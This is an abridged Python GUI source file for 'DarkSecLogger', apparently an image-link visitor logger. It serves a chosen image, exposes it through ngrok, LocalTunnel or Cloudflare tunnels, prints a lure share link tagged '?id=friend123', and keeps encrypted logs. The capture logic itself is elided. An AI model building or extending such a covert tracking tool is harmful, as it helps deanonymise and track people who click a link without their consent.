#!/usr/bin/env python3
# File: DarkSecLoggerV1.8_Refactored.py
...
class DarkSecApp:
    ...
    def _create_styles(self):
        ...
        style.configure('.', background='#1e1e1e', foreground='white', font=('Consolas', 10))
        style.configure('TButton', background='#3c3c3c', foreground='white', borderwidth=1, padding=6)
        style.map('TButton',
                  background=[('active', '#555555'), ('pressed', '#666666')],
                  foreground=[('active', 'white')])
        style.configure('TLabel', foreground='lime', font=("Consolas", 10))
        style.configure('Title.TLabel', font=("Consolas", 20, "bold"))
        style.configure('TLabelframe', bordercolor='gray50', relief='solid')
        style.configure('TLabelframe.Label', foreground='cyan', background='#1e1e1e', font=('Consolas', 11, 'bold'))

        # Special button colors
        style.configure('Start.TButton', background='#28a745', foreground='black', font=('Consolas', 10, 'bold'))
        style.map('Start.TButton', background=[('active', '#218838'), ('pressed', '#1e7e34')])
        style.configure('Stop.TButton', background='#dc3545', foreground='white', font=('Consolas', 10, 'bold'))
    ...
    def _create_widgets(self):
        ...
        # --- Main content frame (controls + logs) ---
        ...
        controls_canvas = tk.Canvas(main_frame, background='#1e1e1e', highlightthickness=0)
        ...
        controls_canvas.grid(row=0, column=0, sticky='ew', pady=(0, 10))
        controls_scrollbar.grid(row=0, column=1, sticky='ns')

        # --- Group: Server Control ---
        server_lf = ttk.LabelFrame(scrollable_frame, text=" Server Control ")
        server_lf.grid(row=0, column=0, padx=5, pady=5, sticky='ew')
        server_lf.columnconfigure(1, weight=1) # Allow entry to expand

        ttk.Label(server_lf, text="Port:").grid(row=0, column=0, padx=5, pady=5, sticky='w')
        self.port_entry = ttk.Entry(server_lf, width=8)
        self.port_entry.insert(0, str(DEFAULT_PORT))
        self.port_entry.grid(row=0, column=1, padx=5, pady=5, sticky='ew')
        ttk.Button(server_lf, text="Set Port", command=self.apply_port).grid(row=0, column=2, padx=5, pady=5)
        ttk.Button(server_lf, text="Select Image", command=self.select_image).grid(row=1, column=0, columnspan=3, padx=5, pady=5, sticky='ew')
        ttk.Button(server_lf, text="Start Server", style='Start.TButton', command=self.start_logging).grid(row=2, column=0, columnspan=2, padx=5, pady=5, sticky='ew')
        ttk.Button(server_lf, text="Stop All", style='Stop.TButton', command=self.stop_logging).grid(row=2, column=2, padx=5, pady=5, sticky='ew')

        # --- Group: Tunneling ---
        tunnel_lf = ttk.LabelFrame(scrollable_frame, text=" Tunneling ")
        tunnel_lf.grid(row=0, column=1, padx=5, pady=5, sticky='nsew')
        ttk.Button(tunnel_lf, text="Start LocalTunnel", style='Tunnel.TButton', command=self.start_localtunnel_gui).grid(row=0, column=0, padx=5, pady=5, sticky='ew')
        ttk.Button(tunnel_lf, text="Start Cloudflare", style='Tunnel.TButton', command=self.start_cloudflare_tunnel).grid(row=1, column=0, padx=5, pady=5, sticky='ew')
        ttk.Button(tunnel_lf, text="Start NGROK", style='Tunnel.TButton', command=self.start_ngrok).grid(row=2, column=0, padx=5, pady=5, sticky='ew')
        ttk.Button(tunnel_lf, text="Stop LocalTunnel", command=self.stop_localtunnel).grid(row=0, column=1, padx=5, pady=5, sticky='ew')
        ttk.Button(tunnel_lf, text="Stop Cloudflare", command=self.stop_cloudflare_tunnel).grid(row=1, column=1, padx=5, pady=5, sticky='ew')

        # --- Group: Utilities ---
        utils_lf = ttk.LabelFrame(scrollable_frame, text=" Utilities ")
        utils_lf.grid(row=0, column=2, padx=5, pady=5, sticky='ns')
        utils_lf.columnconfigure(0, weight=1) # Allow buttons to fill space

        ttk.Button(utils_lf, text="Save Encrypted Logs", command=self.save_logs_encrypted).grid(row=0, column=0, sticky='ew', padx=5, pady=(5,2))
        ttk.Button(utils_lf, text="Decrypt Logs", command=self.decrypt_logs_gui).grid(row=1, column=0, sticky='ew', padx=5, pady=2)
        ttk.Button(utils_lf, text="Set NGROK Token", command=self.set_ngrok_token_gui).grid(row=2, column=0, sticky='ew', padx=5, pady=2)
        ttk.Button(utils_lf, text="Run Dependency Doctor", command=self.run_doctor).grid(row=3, column=0, sticky='ew', padx=5, pady=2)

        # --- Log Console ---
        log_frame = self.build_log_console(main_frame)
    ...
    def _start_localtunnel(self, subdomain: str | None):
        ...
        def reader():
            for line in self.lt_proc.stdout:
                ...
                if url:
                    self.lt_url = url
                    tip = f"\n[+] Share: {url}/{Path(selected_image_path).name}?id=friend123" if selected_image_path else ""
    ...
    def start_ngrok(self):
        ...
        tip = f"\n[+] Share: {self.ngrok_tunnel.public_url}/{Path(selected_image_path).name}?id=friend123" if selected_image_path else ""
        self.log(f"[*] NGROK tunnel: {self.ngrok_tunnel.public_url}{tip}\n", info_box=True)
    ...
    def decrypt_logs_gui(self):
        ...
        ttk.Button(top, text="Save As...", command=lambda: self._save_decrypted(plain)).pack(pady=6)
...
def main_cli():
    ...
    if start_lt: print("[*] Starting LocalTunnel...") # Add subprocess call here
    if start_cf: print("[*] Starting Cloudflare Tunnel...") # Add subprocess call here
    if start_ng: print("[*] Starting NGROK...") # Add pyngrok call here
